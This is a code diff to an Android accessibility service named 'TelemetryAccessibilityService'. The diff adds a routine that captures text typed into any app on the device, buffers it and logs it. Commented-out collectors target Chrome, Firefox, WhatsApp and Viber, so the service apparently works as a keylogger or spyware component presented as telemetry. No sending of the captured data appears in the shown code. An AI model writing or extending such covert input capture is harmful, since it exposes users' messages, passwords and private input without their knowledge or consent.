@@ -3,15 +3,15 @@ package com.example.back.accessibilitytest
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.os.Build
+import android.os.Handler
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityEvent.TYPE_VIEW_SCROLLED
-import android.view.accessibility.AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
 import android.view.accessibility.AccessibilityNodeInfo
 import com.example.back.accessibilitytest.models.VkLikesModel
 import java.util.*
 
-class TelemetryAccessibilityService7 : AccessibilityService() {
+class TelemetryAccessibilityService8 : AccessibilityService() {
     private val URL = "URL"
     private val VIEW = "android.view.View"
     private val WEBVIEW = "android.webkit.WebView"
@@ -88,7 +88,7 @@ class TelemetryAccessibilityService7 : AccessibilityService() {
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         event?.let {
-            showEverything(it)
+            //            showEverything(it)
 
 //            val eventTextPair = getTextFromEvents(event,
 //                    arrayListOf(MOZILLA_FIREFOX, CHROME),
@@ -102,6 +102,33 @@ class TelemetryAccessibilityService7 : AccessibilityService() {
 //            collectForBrowsers(event)
 //            collectForWhatsapp(event)
 //            collectForViber(event)
+            collectAllInput(event)
+        }
+    }
+
+    private val handler = Handler()
+    private val runnable = Runnable { saveText(latestText) }
+    @Volatile
+    private var latestText: String? = null
+
+    private fun collectAllInput(event: AccessibilityEvent) {
+        if (event.text != null && event.text.isNotEmpty()
+                && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            latestText = event.text[0].toString()
+            handler.removeCallbacks(runnable)
+            handler.postDelayed(runnable, 800L)
+        }
+    }
+
+    private val textList = arrayListOf<CharSequence>()
+    private fun saveText(text: String?) {
+        text?.let {
+            //            if(System.currentTimeMillis() - lastChangeTime > 1000) {
+//                textList.add(text.joinToString(""))
+//                lastChangeTime = System.currentTimeMillis()
+//            }
+            textList.add(it)
+            Log.e("234", "saved text: ${it}")
         }
     }
 
@@ -185,7 +212,9 @@ class TelemetryAccessibilityService7 : AccessibilityService() {
 //            return
 
         if (event.text != null && event.text.isNotEmpty())
-            Log.e("234", " ${event.source?.viewIdResourceName} ${event.text} ${event.eventType}")
+            Log.e("234", " ${event.source?.viewIdResourceName} " +
+                    "${event.text} ${event.eventType}" +
+                    "${event.action} ${event.source} ")
 
         var parent = event.source
         while (parent != null) {
@@ -382,7 +411,7 @@ class TelemetryAccessibilityService7 : AccessibilityService() {
 
     private fun showChildren(info: AccessibilityNodeInfo?, from: String? = "") {
         info?.let {
-            Log.e("234", "from: ${it.viewIdResourceName}")
+            //            Log.e("234", "from: ${it.viewIdResourceName} ${it.inputType}")
 //            Log.e("234", "----------- from: ${it.viewIdResourceName}")
             for (i in 0 until it.childCount) {
                 val child = it.getChild(i)
